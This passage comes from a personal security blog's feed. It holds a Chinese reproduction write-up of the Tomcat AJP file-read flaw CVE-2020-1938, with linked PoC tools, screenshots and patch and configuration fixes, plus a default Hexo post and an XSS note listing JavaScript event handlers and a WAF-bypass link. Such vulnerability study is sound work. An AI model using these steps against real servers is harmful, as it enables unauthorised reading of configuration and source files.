src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/1.png" alt="1"><br>本次漏洞利用的是AJP协议，该协议工作在8009端口，查看本机已开启：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/2.png" alt="2"><br>使用<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi-master</a>的poc利用成功读取<code>WEB-INF/web.xml</code>文件：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/3.png" alt="3"><br>该POC读取目录为ROOT，其他目录不行：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/4.png" alt="4"><br>我们在目录下新建一个test.txt的文档，使用poc成功读取<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/5.png" alt="5"><br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/6.png" alt="6"><br>上面脚本只支持python2，我们使用<a href="https://github.com/hypn0s/AJPy" target="_blank" rel="noopener">AJPy-master</a>的poc同样成功，这个脚本还能对tomcat进行暴力破解，文件上传等<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/7.png" alt="7"><br>可以修改–webapp=manager来指定查看webapp目录下的子目录中文件<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/8.png" alt="8"></p><h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><h3 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h3><p>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方下载链接：</p><table><thead><tr><th>版本号</th><th>下载地址</th></tr></thead><tbody><tr><td>Apache Tomcat 7.0.100</td><td><a href="http://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-70.cgi</a></td></tr><tr><td>Apache Tomcat 8.5.51</td><td><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-80.cgi</a></td></tr><tr><td>Apache Tomcat 9.0.31</td><td><a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="noopener">http://tomcat.apache.org/download-90.cgi</a></td></tr></tbody></table><h3 id="其他安全防护措施"><a href="#其他安全防护措施" class="headerlink" title="其他安全防护措施"></a>其他安全防护措施</h3><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p><strong>关闭AJP</strong></p><p>如若用不到Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作如下</p><p>a. 编辑 <code>&lt;CATALINABASE&gt;/conf/server.xml</code>，找到如下行（<code>&lt;CATALINABASE&gt;</code> 为 <code>Tomcat</code> 的工作目录）：`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;”8009″protocol&#x3D;”AJP&#x2F;1.3″ redirectPort&#x3D;”8443″&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>b. 然后将其注释掉或者删掉, (以下为注释的方式):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!–&lt;Connectorport&#x3D;”8009″protocol&#x3D;”AJP&#x2F;1.3″redirectPort&#x3D;”8443″ &#x2F;&gt;–&gt;</span><br></pre></td></tr></table></figure><p>c. 保存后重新启动Tomcat，即可生效.</p><p><strong>添加认证凭证</strong></p><p>如若需要使用AJP协议，可根据当前版本配置协议属性设置认证凭证，主要使用配置AJP配置中的secretRequired跟secret属性来限制认证。</p><p>具体操作如下</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将<code>YOURTOMCATAJP_SECRET</code>更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将<code>YOURTOMCATAJP_SECRET</code>更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connectorport&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; requiredSecret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件,如：webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。&lt;/p&gt;
&lt;p&gt;Apache Tomcat都是Apache开源组织开发的用于处理HTTP服务的免费项目，可以作为独立的Web服务器运行。Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，所以本次通告的漏洞影响范围较大，请相关用户及时采取防护措施或者升级补丁修复此漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE-2020-1938" scheme="http://yoursite.com/tags/CVE-2020-1938/"/>
    
      <category term="Tomcat" scheme="http://yoursite.com/tags/Tomcat/"/>
    
      <category term="表单验证" scheme="http://yoursite.com/tags/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/"/>
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/06/02/hello-world/"/>
    <id>http://yoursite.com/2020/06/02/hello-world/</id>
    <published>2020-06-02T08:43:20.434Z</published>
    <updated>2020-05-26T02:43:33.588Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XSS 函数</title>
    <link href="http://yoursite.com/2020/05/25/XSS/"/>
    <id>http://yoursite.com/2020/05/25/XSS/</id>
    <published>2020-05-25T06:36:41.000Z</published>
    <updated>2020-06-03T11:05:13.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><h2 id="Tips-amp-tricks"><a href="#Tips-amp-tricks" class="headerlink" title="Tips &amp; tricks"></a>Tips &amp; tricks</h2><p>Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)</p><ul><li><a href="https://brutelogic.com.br/blog/xss-without-event-handlers/" target="_blank" rel="noopener">XSS without event handlers</a>: pour les situations où les events du type onerror sont bloqués</li></ul><a id="more"></a><h2 id="Liste-des-events-javascripts"><a href="#Liste-des-events-javascripts" class="headerlink" title="Liste des events javascripts"></a>Liste des events javascripts</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">onclick</span><br><span class="line">oncontextmenu</span><br><span class="line">ondblclick</span><br><span class="line">onmousedown</span><br><span class="line">onmouseenter</span><br><span class="line">onmouseleave</span><br><span class="line">onmousemove</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmouseup</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">onabort</span><br><span class="line">onbeforeunload</span><br><span class="line">onerror</span><br><span class="line">onhashchange</span><br><span class="line">onload</span><br><span class="line">onpageshow</span><br><span class="line">onpagehide</span><br><span class="line">onresize</span><br><span class="line">onscroll</span><br><span class="line">onunload</span><br><span class="line">onblur</span><br><span class="line">onchange</span><br><span class="line">onfocus</span><br><span class="line">onfocusin</span><br><span class="line">onfocusout</span><br><span class="line">oninput</span><br><span class="line">oninvalid</span><br><span class="line">onreset</span><br><span class="line">onsearch</span><br><span class="line">onselect</span><br><span class="line">onsubmit</span><br><span class="line">ondrag</span><br><span class="line">ondragend</span><br><span class="line">ondragenter</span><br><span class="line">ondragleave</span><br><span class="line">ondragover</span><br><span class="line">ondragstart</span><br><span class="line">ondrop</span><br><span class="line">oncopy</span><br><span class="line">oncut</span><br><span class="line">onpaste</span><br><span class="line">onafterprint</span><br><span class="line">onbeforeprint</span><br><span class="line">onabort</span><br><span class="line">oncanplay</span><br><span class="line">oncanplaythrough</span><br><span class="line">ondurationchange</span><br><span class="line">onended</span><br><span class="line">onerror</span><br><span class="line">onloadeddata</span><br><span class="line">onloadedmetadata</span><br><span class="line">onloadstart</span><br><span class="line">onpause</span><br><span class="line">onplay</span><br><span class="line">onplaying</span><br><span class="line">onprogress</span><br><span class="line">onratechange</span><br><span class="line">onseeked</span><br><span class="line">onseeking</span><br><span class="line">onstalled</span><br><span class="line">onsuspend</span><br><span class="line">ontimeupdate</span><br><span class="line">onvolumechange</span><br><span class="line">onwaiting</span><br><span class="line">onerror</span><br><span class="line">onmessage</span><br><span class="line">onopen</span><br><span class="line">onwheel</span><br><span class="line">ononline</span><br><span class="line">onoffline</span><br><span class="line">onshow</span><br><span class="line">ontoggle</span><br><span class="line">onwheel</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cross-Site-Scripting&quot;&gt;&lt;a href=&quot;#Cross-Site-Scripting&quot; class=&quot;headerlink&quot; title=&quot;Cross-Site Scripting&quot;&gt;&lt;/a&gt;Cross-Site Scripting&lt;/h1&gt;&lt;h2 id=&quot;Tips-amp-tricks&quot;&gt;&lt;a href=&quot;#Tips-amp-tricks&quot; class=&quot;headerlink&quot; title=&quot;Tips &amp;amp; tricks&quot;&gt;&lt;/a&gt;Tips &amp;amp; tricks&lt;/h2&gt;&lt;p&gt;Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://brutelogic.com.br/blog/xss-without-event-handlers/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XSS without event handlers&lt;/a&gt;: pour les situations où les events du type onerror sont bloqués&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
      <category term="跨站脚本" scheme="http://yoursite.com/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
</feed>
